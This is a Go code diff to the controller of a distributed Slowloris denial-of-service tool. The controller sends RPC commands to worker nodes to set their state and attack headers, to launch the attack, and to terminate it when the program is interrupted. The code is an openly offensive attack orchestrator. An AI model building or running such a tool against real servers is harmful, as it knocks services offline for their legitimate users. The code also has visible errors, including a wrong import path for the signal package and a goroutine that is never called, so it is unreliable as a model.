@@ -5,6 +5,8 @@ import (
   "net/rpc"
   "Distributed-Slow-Loris/shared"
   "fmt"
+  "os"
+  "signal"
 )
 
 const (
@@ -13,6 +15,7 @@ const (
   SETSTATE = "Worker.SetState"
   SETHEADERS = "Worker.SetHeaders"
   ATTACK = "Worker.Attack"
+  TERM = "Worker.Terminate"
 )
 
 /*
@@ -75,6 +78,11 @@ func main() {
     Loris: []byte("X-a 1\r\n"),
   }
 
+  // attack request and response paramters, only needed to
+  // satisfy RPC convention
+  attackReq := 0
+  attackRes := 0
+
   // store status codes for setting worker state (only necessary to uphold RPC convention)
   var setStateRes, setHeadersRes int
 
@@ -93,10 +101,34 @@ func main() {
       } else {
         fmt.Println("SET STATE")
       }
+      if err := conn.Call(ATTACK, attackReq, &attackRes); err != nil {
+        fmt.Println("Error executing attack")
+      } else {
+        fmt.Println("EXECUTING ATTACK")
+      }
     }()
   }
-  // using dummy loop to keep broadcaster from termianting (HACKY)
-  for {
-  }
 
+
+  interruptChan := make(chan os.Signal, 1)
+  doneChan := make(chan int)
+  // send SIGINT to interruptChan
+  signal.Notify(interruptChan, os.Interrupt)
+  // blocking goroutine, waits on OS interrupt to
+  // execute termination RPC, main is blocked on response
+  go func() {
+    <-interruptChan
+    fmt.Println("Goodbye")
+    for _, conn := range broadcaster.clients {
+      req := 0
+      res := 0
+      // terminate slow loris attacks
+      for err := conn.Call(TERM, req, &res); err != nil {
+        fmt.Println("error terminating connection, trying again")
+      }
+    }
+    // unblock main after terminating slow loris attacks
+    doneChan<-1
+  }
+  <-doneChan
 }
